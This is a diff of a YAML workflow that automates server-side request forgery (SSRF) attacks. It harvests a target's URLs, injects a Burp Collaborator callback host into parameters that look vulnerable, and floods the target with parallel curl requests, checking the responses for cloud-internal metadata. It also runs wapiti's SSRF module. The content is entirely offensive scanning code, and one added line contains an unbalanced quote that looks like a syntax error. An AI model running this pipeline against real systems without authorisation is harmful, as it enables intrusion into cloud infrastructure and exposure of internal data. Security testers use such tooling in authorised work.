@@ -10,12 +10,12 @@ steps:
   - name: CustomSSRF-External
     command: bash
     script: |
-      gau ${target//\"} | gf ssrf | sort -u |anew | ~/go/bin/httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
+      gau ${target//\"} | gf ssrf | sort -u | anew | httpx | qsreplace ${burpcollaborator_link//\"}" | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
   - name: CustomSSRF-Internal
     command: bash
     script: |
-      ~/go/bin/httpx -u ${target//\"} | katana -H "$header" qurl  | gf ssrf | sort -u |anew | ~/go/bin/httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl  | gf ssrf | sort -u | anew | httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
   - name: AutoSSRF
     command: bash
     script: |
-      ~/go/bin/httpx -u $target -o resSSRF_${target//\"}.txt ; wapiti -u "$(cat resSSRF_${target//\"}.txt)" -m ssrf -H ${header//\"}
+      httpx -u $target -o resSSRF_${target//\"}.txt ; wapiti -u "$(cat resSSRF_${target//\"}.txt)" -m ssrf -H ${header//\"}
